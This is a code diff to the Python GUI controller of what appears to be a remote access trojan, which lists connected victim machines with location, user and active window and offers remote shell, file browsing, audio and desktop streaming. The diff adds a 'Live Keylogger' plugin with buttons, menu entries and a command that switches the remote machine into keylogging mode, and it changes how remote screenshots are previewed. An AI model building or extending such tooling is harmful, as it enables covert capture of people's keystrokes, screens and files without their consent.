@@ -9,6 +9,7 @@ import zlib
 import threading
 import hashlib
 import Image
+import ImageQt
 import string
 import random
 from threading import Thread
@@ -24,6 +25,7 @@ from plugins.maudio import main as maudio
 from plugins.mexplorer import main as mexplorer
 from plugins.mshell import main as mshell
 from plugins.mdesktop import main as mdesktop
+from plugins.mkeylogger import main as mkeylogger
 
 
 # initial geo ip database
@@ -32,9 +34,6 @@ geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')
 # initial assets directories
 assets = os.path.join(os.getcwd(), 'assets\\')
 flags = os.path.join(assets, 'flags')
-temp_folder = os.path.join(os.getcwd(), 'tmp')
-if not os.path.exists(temp_folder):
-    os.mkdir(temp_folder)
 
 
 def get_ip_location(ip):
@@ -84,6 +83,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.remoteExplorerButton.setDisabled(True)
         self.remoteAudioButton.setDisabled(True)
         self.remoteDesktopButton.setDisabled(True)
+        self.remoteDesktopButton2.setDisabled(True)
+        self.remoteKeyloggerButton.setDisabled(True)
         self.lockServerButton.setDisabled(True)
         self.lockServerButton.setVisible(False)
         self.quitServerButton.setDisabled(True)
@@ -99,12 +100,12 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.index_of_version = 5
         self.index_of_activeWindowTitle = 6
         # initialize servers table columns width
-        self.serversTable.setColumnWidth(self.index_of_ipAddress, 150)
-        self.serversTable.setColumnWidth(self.index_of_socket, 60)
-        self.serversTable.setColumnWidth(self.index_of_lock, 90)
-        self.serversTable.setColumnWidth(self.index_of_os, 100)
-        self.serversTable.setColumnWidth(self.index_of_user, 100)
-        self.serversTable.setColumnWidth(self.index_of_version, 60)
+        self.serversTable.setColumnWidth(self.index_of_ipAddress, 100)
+        self.serversTable.setColumnWidth(self.index_of_socket, 50)
+        self.serversTable.setColumnWidth(self.index_of_lock, 80)
+        self.serversTable.setColumnWidth(self.index_of_os, 90)
+        self.serversTable.setColumnWidth(self.index_of_user, 90)
+        self.serversTable.setColumnWidth(self.index_of_version, 50)
         # servers table double click trigger
         self.serversTable.doubleClicked.connect(self.unlock_server)
         # Initializing right click menu
@@ -125,6 +126,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.remoteExplorerButton.clicked.connect(self.run_explorer)
         self.remoteAudioButton.clicked.connect(self.run_audio)
         self.remoteDesktopButton.clicked.connect(self.run_desktop)
+        self.remoteDesktopButton2.clicked.connect(self.run_desktop)
+        self.remoteKeyloggerButton.clicked.connect(self.run_keylogger)
 
         # Custom signal for update server table
         self.connect(self, SIGNAL('updateTable()'), self.updateServersTable)
@@ -133,6 +136,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_plugin(plugin='explorer'))
         self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_plugin(plugin='audio'))
         self.connect(self, SIGNAL('executeDesktop()'), lambda: self.execute_plugin(plugin='desktop'))
+        self.connect(self, SIGNAL('executeKeylogger()'), lambda: self.execute_plugin(plugin='keylogger'))
 
     # Start Listen for Servers
     def listen_start(self):
@@ -282,16 +286,11 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             screen_dict = get(self.socks[server]['sock'], 'getScreen', 'screenshot')
             try:
                 screen_info = ast.literal_eval(screen_dict)
-                width = screen_info['width']
-                height = screen_info['height']
-                screenbits = screen_info['screenshot']
-                path_to_preview = os.path.join(temp_folder, '__preview.png')
-                raw = zlib.decompress(screenbits)
-                size = (int(width), int(height))
-                im = Image.frombuffer('RGB', size, raw, 'raw', 'BGRX', 0, 1)
-                im.save(path_to_preview, 'PNG')
-                pixmap = QPixmap(path_to_preview).scaled(QSize(280, 175))
-                self.previewLabel.setPixmap(pixmap)
+                im = Image.frombuffer('RGB', (int(screen_info['width']), int(screen_info['height'])),
+                                      zlib.decompress(screen_info['screenshotbits']), 'raw', 'BGRX', 0, 1)
+                screen_bits = im.convert('RGBA')
+                self.previewLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(screen_bits)).scaled(
+                self.previewLabel.size(), Qt.KeepAspectRatio))
             except SyntaxError:
                 pass
 
@@ -381,6 +380,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.remoteShellButton.setDisabled(True)
                 self.remoteAudioButton.setDisabled(True)
                 self.remoteDesktopButton.setDisabled(True)
+                self.remoteDesktopButton2.setDisabled(True)
+                self.remoteKeyloggerButton.setDisabled(True)
                 self.lockServerButton.setVisible(False)
                 self.lockServerButton.setDisabled(True)
                 self.quitServerButton.setDisabled(True)
@@ -389,6 +390,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.remoteShellButton.setDisabled(False)
                 self.remoteAudioButton.setDisabled(False)
                 self.remoteDesktopButton.setDisabled(False)
+                self.remoteDesktopButton2.setDisabled(False)
+                self.remoteKeyloggerButton.setDisabled(False)
                 self.lockServerButton.setVisible(True)
                 self.lockServerButton.setDisabled(False)
                 self.quitServerButton.setDisabled(False)
@@ -400,13 +403,14 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.remoteShellButton.setDisabled(True)
             self.remoteAudioButton.setDisabled(True)
             self.remoteDesktopButton.setDisabled(True)
+            self.remoteDesktopButton2.setDisabled(True)
+            self.remoteKeyloggerButton.setDisabled(True)
             self.lockServerButton.setVisible(False)
             self.lockServerButton.setDisabled(True)
             self.quitServerButton.setDisabled(True)
             self.unlockServerButton.setVisible(True)
             self.unlockServerButton.setDisabled(True)
             self.updatePreviewButton.setDisabled(True)
-            self.previewLabel.setPixmap(QPixmap(os.path.join(assets, 'monitor.png')).scaled(QSize(280, 175)))
 
     def server_right_click_menu(self, point):
         server_index = self.serversTable.currentRow()
@@ -423,6 +427,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                  self.run_explorer)
             self.eMenu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Audio Streaming', self.run_audio)
             self.eMenu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')), 'Desktop Streaming', self.run_desktop)
+            self.eMenu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), 'Live Keylogger', self.run_keylogger)
 
             self.eMenu.addSeparator()
             self.eMenu.addMenu(self.optionsMenu)
@@ -447,6 +452,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'explorerMode': 'executeExplorer()',
             'audioMode': 'executeAudio()',
             'desktopMode': 'executeDesktop()',
+            'keyloggerMode': 'executeKeylogger()'
         }
         if signal in signals:
             self.current_sock = sock
@@ -458,6 +464,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'explorer': mexplorer,
             'audio': maudio,
             'desktop': mdesktop,
+            'keylogger': mkeylogger
         }
 
         server = self.current_server()
@@ -465,8 +472,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             args = {
                 'sock': self.current_sock,
                 'socket': self.socks[server]['socket'],
-                'ipAddress': self.socks[server]['ip_address'],
-                'tempPath': temp_folder
+                'ipAddress': self.socks[server]['ip_address']
             }
             plugin_id = id_generator()
             if plugin in plugins:
@@ -492,6 +498,11 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         server = self.current_server()
         if server:
             send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'desktopMode')
+
+    def run_keylogger(self):
+        server = self.current_server()
+        if server:
+            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'keyloggerMode')
 
     def closeEvent(self, event):
         sys.exit(1)
